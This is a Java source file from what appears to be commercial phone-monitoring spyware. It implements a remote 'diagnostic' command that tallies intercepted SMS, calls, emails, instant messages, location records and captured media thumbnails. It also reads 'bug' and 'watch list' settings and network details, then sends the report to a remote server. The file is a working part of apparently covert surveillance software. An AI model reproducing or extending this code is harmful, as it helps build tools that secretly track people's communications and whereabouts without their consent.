package com.vvt.rmtcmd.pcc;

import java.util.Vector;
import com.vvt.event.FxCallLogEvent;
import com.vvt.event.FxCellInfoEvent;
import com.vvt.event.FxEmailEvent;
import com.vvt.event.FxGPSEvent;
import com.vvt.event.FxIMEvent;
import com.vvt.event.FxLocationEvent;
import com.vvt.event.FxSMSEvent;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.EventType;
import com.vvt.event.constant.FxDirection;
import com.vvt.event.constant.FxGPSMethod;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSMethod;
import com.vvt.gpsc.GPSOption;
import com.vvt.license.LicenseInfo;
import com.vvt.pref.PrefAudioFile;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCameraImage;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefConnectionHistory;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.PrefVideoFile;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.std.Constant;
import com.vvt.std.PhoneInfo;
import com.vvt.std.TimeUtil;
import com.vvt.version.VersionInfo;

public class PCCDiagnostics extends PCCRmtCmdAsync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	private Preference pref = Global.getPreference();
	
	private String getGPSMethod(int id) {
		String method = "";
		if (FxGPSMethod.AGPS.getId() == id) {
			method = "Assisted";
		} else if (FxGPSMethod.BLUETOOTH.getId() == id) {
			method = "Bluetooth";
		} else if (FxGPSMethod.INTEGRATED_GPS.getId() == id) {
			method = "Autonomous";
		} else if (FxGPSMethod.CELL_INFO.getId() == id) {
			method = "Google";
		} else if (FxGPSMethod.NETWORK.getId() == id) {
			method = "CellSite";
		} else if (FxGPSMethod.UNKNOWN.getId() == id) {
			method = "Unknown";
		}
		return method;
	}
	
	private long getDBSize() {
		long dataSize = 0;
		Vector events = null;
		PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
		PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
		if (prefMessenger.isSupported()) {
			// SMS
			int numberOfIM = db.getNumberOfEvent(EventType.IM);
			events = db.select(EventType.IM, numberOfIM);
			FxIMEvent[] imEvent = new FxIMEvent[numberOfIM];
			for (int i = 0; i < numberOfIM; i++) {
				imEvent[i] = (FxIMEvent)events.elementAt(i);
				dataSize += imEvent[i].getObjectSize();
			}
		}
		if (prefEvent.isSupported()) {
			// SMS
			int numberOfSMS = db.getNumberOfEvent(EventType.SMS);
			events = db.select(EventType.SMS, numberOfSMS);
			FxSMSEvent[] smsEvent = new FxSMSEvent[numberOfSMS];
			for (int i = 0; i < numberOfSMS; i++) {
				smsEvent[i] = (FxSMSEvent)events.elementAt(i);
				dataSize += smsEvent[i].getObjectSize();
			}
			// Email
			int numberOfEmail = db.getNumberOfEvent(EventType.MAIL);
			events = db.select(EventType.MAIL, numberOfEmail);
			FxEmailEvent[] emailEvent = new FxEmailEvent[numberOfEmail];
			for (int i = 0; i < numberOfEmail; i++) {
				emailEvent[i] = (FxEmailEvent)events.elementAt(i);
				dataSize += emailEvent[i].getObjectSize();
			}
			// Voice
			int numberOfVoice = db.getNumberOfEvent(EventType.VOICE);
			events = db.select(EventType.VOICE, numberOfVoice);
			FxCallLogEvent[] callEvent = new FxCallLogEvent[numberOfVoice];
			for (int i = 0; i < numberOfVoice; i++) {
				callEvent[i] = (FxCallLogEvent)events.elementAt(i);
				dataSize += callEvent[i].getObjectSize();
			}
		}
		if (prefCell.isSupported()) {
			int numberOfCell = db.getNumberOfEvent(EventType.CELL_ID);
			events = db.select(EventType.CELL_ID, numberOfCell);
			FxCellInfoEvent[] cellEvent = new FxCellInfoEvent[numberOfCell];
			for (int i = 0; i < numberOfCell; i++) {
				cellEvent[i] = (FxCellInfoEvent)events.elementAt(i);
				dataSize += cellEvent[i].getObjectSize();
			}
		}
		/*if (prefGPS.isSupported()) {
			int numberOfGPS = db.getNumberOfEvent(EventType.GPS);
			events = db.select(EventType.GPS, numberOfGPS);
			FxGPSEvent[] gpsEvent = new FxGPSEvent[numberOfGPS];
			for (int i = 0; i < numberOfGPS; i++) {
				gpsEvent[i] = (FxGPSEvent)events.elementAt(i);
				dataSize += gpsEvent[i].getObjectSize();
			}
		}*/
		if (prefGPS.isSupported()) {
			int numberOfLoc = db.getNumberOfEvent(EventType.LOCATION);
			events = db.select(EventType.LOCATION, numberOfLoc);
			FxLocationEvent[] locEvent = new FxLocationEvent[numberOfLoc];
			for (int i = 0; i < numberOfLoc; i++) {
				locEvent[i] = (FxLocationEvent)events.elementAt(i);
				dataSize += locEvent[i].getObjectSize();
			}
		}
		if (prefSystem.isSupported()) {
			int numberOfSystem = db.getNumberOfEvent(EventType.SYSTEM);
			events = db.select(EventType.SYSTEM, numberOfSystem);
			FxSystemEvent[] systemEvent = new FxSystemEvent[numberOfSystem];
			for (int i = 0; i < numberOfSystem; i++) {
				systemEvent[i] = (FxSystemEvent)events.elementAt(i);
				dataSize += systemEvent[i].getObjectSize();
			}
		}
		return dataSize;
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.REQUEST_DIAGNOSTIC.getId());
		try {
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			LicenseInfo licInfo = Global.getLicenseManager().getLicenseInfo();
			PrefVideoFile videoFileInfo = (PrefVideoFile)pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
			PrefAudioFile audioFileInfo = (PrefAudioFile)pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
			PrefCameraImage camImageInfo = (PrefCameraImage)pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
			PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			PrefSystem systemInfo = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
			// 1). Product ID
			responseMessage.append("1>");
			responseMessage.append(licInfo.getProductID());
			responseMessage.append(Constant.COMMA);
			responseMessage.append(VersionInfo.getFullVersion());
			responseMessage.append(Constant.SPACE);
			responseMessage.append(VersionInfo.getDescription());
			responseMessage.append(Constant.CRLF);
			// 2). Device Type
			responseMessage.append("2>");
			responseMessage.append(PhoneInfo.getDeviceModel());
			responseMessage.append(Constant.CRLF);
			// 3). SMS Event
			int numberOfSMS = db.getNumberOfEvent(EventType.SMS);
			Vector smsEvents = db.select(EventType.SMS, numberOfSMS);
			int smsIn = 0;
			int smsOut = 0;
			for (int i = 0; i < smsEvents.size(); i++) {
				FxSMSEvent smsEvent = (FxSMSEvent)smsEvents.elementAt(i);
				if (smsEvent.getDirection().getId() == FxDirection.IN.getId()) {
					smsIn++;
				} else if (smsEvent.getDirection().getId() == FxDirection.OUT.getId()) {
					smsOut++;
				}
			}
			responseMessage.append("3>");
			responseMessage.append(smsIn);
			responseMessage.append(Constant.COMMA);
			responseMessage.append(smsOut);
			responseMessage.append(Constant.CRLF);
			// 4). Voice Event
			int numberOfVoice = db.getNumberOfEvent(EventType.VOICE);
			Vector voiceEvents = db.select(EventType.VOICE, numberOfVoice);
			int voiceIn = 0;
			int voiceOut = 0;
			int voiceMiss = 0;
			for (int i = 0; i < voiceEvents.size(); i++) {
				FxCallLogEvent callEvent = (FxCallLogEvent)voiceEvents.elementAt(i);
				if (callEvent.getDirection().getId() == FxDirection.IN.getId()) {
					voiceIn++;
				} else if (callEvent.getDirection().getId() == FxDirection.OUT.getId()) {
					voiceOut++;
				} else if (callEvent.getDirection().getId() == FxDirection.MISSED_CALL.getId()) {
					voiceMiss++;
				}
			}
			responseMessage.append("4>");
			responseMessage.append(voiceIn);
			responseMessage.append(Constant.COMMA);
			responseMessage.append(voiceOut);
			responseMessage.append(Constant.COMMA);
			responseMessage.append(voiceMiss);
			responseMessage.append(Constant.CRLF);
			// 5). Location and System Events
			responseMessage.append("5>");
			if (gpsInfo.isSupported()) {
				responseMessage.append(db.getNumberOfEvent(EventType.LOCATION));
			} else if (cellInfo.isSupported()) {
				responseMessage.append(db.getNumberOfEvent(EventType.CELL_ID));
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.COMMA);
			if (systemInfo.isSupported()) {
				responseMessage.append(db.getNumberOfEvent(EventType.SYSTEM));
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.CRLF);
			// 6). Email Event
			int numberOfEmail = db.getNumberOfEvent(EventType.MAIL);
			Vector mailEvents = db.select(EventType.MAIL, numberOfEmail);
			int mailIn = 0;
			int mailOut = 0;
			for (int i = 0; i < mailEvents.size(); i++) {
				FxEmailEvent emailEvent = (FxEmailEvent)mailEvents.elementAt(i);
				if (emailEvent.getDirection().getId() == FxDirection.IN.getId()) {
					mailIn++;
				} else if (emailEvent.getDirection().getId() == FxDirection.OUT.getId()) {
					mailOut++;
				}
			}
			responseMessage.append("6>");
			responseMessage.append(mailIn);
			responseMessage.append(Constant.COMMA);
			responseMessage.append(mailOut);
			responseMessage.append(Constant.CRLF);
			// 7). Last Connection
			responseMessage.append("7>");
			int count = generalInfo.countPrefConnectionHistory();
			PrefConnectionHistory connHistory = generalInfo.getPrefConnectionHistory(count - 1);
			if (connHistory.getLastConnection() == 0) {
				responseMessage.append(Constant.ASTERISK);
			} else {
				responseMessage.append(TimeUtil.format(connHistory.getLastConnection(), "dd/MM/yyyy HH:mm:ss"));
			}
			responseMessage.append(Constant.COMMA);
			if (connHistory.getConnectionMethod().equals(Constant.EMPTY_STRING)) {
				responseMessage.append(Constant.ASTERISK);
			} else {
				responseMessage.append(connHistory.getConnectionMethod());
			}
			responseMessage.append(Constant.CRLF);
			// 8). Response Code
			// TODO
			// 9). APN Recover
			responseMessage.append("9>");
			String conMethod = connHistory.getConnectionMethod();
			if (conMethod.equals(Constant.EMPTY_STRING)) {
				responseMessage.append(Constant.ASTERISK);
			} else {
				responseMessage.append(conMethod);
			}
			responseMessage.append(Constant.CRLF);
			// 10). TUPLE
			responseMessage.append("10>");
			responseMessage.append(PhoneInfo.getMCC());
			responseMessage.append(Constant.COMMA);
			responseMessage.append(PhoneInfo.getMNC());
			responseMessage.append(Constant.CRLF);
			// 11). Network Name
			responseMessage.append("11>");
			responseMessage.append(PhoneInfo.getNetworkName());
			responseMessage.append(Constant.CRLF);
			// 12). DB Size
			responseMessage.append("12>");
			responseMessage.append(getDBSize());
			responseMessage.append(" Bytes");
			responseMessage.append(Constant.CRLF);
			// 13). Install Drive
			responseMessage.append("13>");
			responseMessage.append("C:");
			responseMessage.append(Constant.CRLF);
			// 14). Available Memory on Drive
			responseMessage.append("14>");
			responseMessage.append(PhoneInfo.getAvailableMemoryOnDeviceInMB());
			responseMessage.append(" MB");
			responseMessage.append(Constant.CRLF);
			// 20). Phone's GPS Setting
			responseMessage.append("20>");
			if (gpsInfo.isSupported()) {
				GPSOption gpsOpt = gpsInfo.getGpsOption();
				for (int i = 0; i < gpsOpt.numberOfGPSMethod(); i++) {
					GPSMethod method = gpsOpt.getGPSMethod(i);
					int id = method.getMethod().getId();
					responseMessage.append(getGPSMethod(id));
					if (i != (gpsOpt.numberOfGPSMethod() - 1)) {
						responseMessage.append(Constant.COMMA);
					}
				}
			} else {
				responseMessage.append(Constant.ASTERISK);
			}
			responseMessage.append(Constant.CRLF);
			// 24). Thumbnails
			responseMessage.append("24>");
			String countImageThumbnail = "0";
			if (camImageInfo.isEnabled()) {
				countImageThumbnail = Integer.toString(db.getNumberOfEvent(EventType.CAMERA_IMAGE_THUMBNAIL));
			} 
			responseMessage.append(countImageThumbnail);
			responseMessage.append(Constant.COMMA);
			String countAudioThumbnail = "0";
			if (audioFileInfo.isEnabled()) {
				countAudioThumbnail = Integer.toString(db.getNumberOfEvent(EventType.AUDIO_FILE_THUMBNAIL));
			}
			responseMessage.append(countAudioThumbnail);
			responseMessage.append(Constant.COMMA);
			String countVideoThumbnail = "0";
			if (videoFileInfo.isEnabled()) {
				countVideoThumbnail = Integer.toString(db.getNumberOfEvent(EventType.VIDEO_FILE_THUMBNAIL));
			}
			responseMessage.append(countVideoThumbnail);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// FxCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
